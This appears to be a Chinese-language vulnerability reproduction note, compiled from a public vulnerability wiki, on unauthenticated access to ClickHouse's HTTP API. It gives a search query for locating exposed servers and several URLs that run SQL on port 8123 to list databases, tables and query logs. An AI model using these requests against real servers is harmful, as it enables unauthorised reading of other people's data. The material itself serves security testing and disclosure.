---
title: "ClickHouse API 数据库接口未授权访问漏洞"
date: 2026-10-15 09:05:52
categories:
  - WebSecurity
  - CVE
  - "数据库"
  - "ClickHouse"
tags:
  - "ClickHouse"
  - "未授权访问"
  - "漏洞复现"
---
## 漏洞描述

ClickHouse API 数据库接口存在未授权访问漏洞，攻击者通过漏洞可以执行任意SQL命令获取数据库数据

## 漏洞影响

```
ClickHouse
```

## 网络测绘

```
"ClickHouse" && body="ok"
```

## 漏洞复现

登录页面

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/database/images/202202091258079.png)

执行SQL语句

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/database/images/202202091258245.png)

```
http://your-ip:8123/?query=SELECT%20*%20FROM%20system.query_thread_log%20LIMIT%201%20FORMAT%20Vertical
```

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/database/images/202202091258274-16898396122771.png)

其他的SQL语句：

```
http://your-ip:8123/?query=SHOW%20DATABASES
```

```
http://your-ip:8123/?query=SELECT%20*%20FROM%20system.tables
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/database/ClickHouse-API-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md)
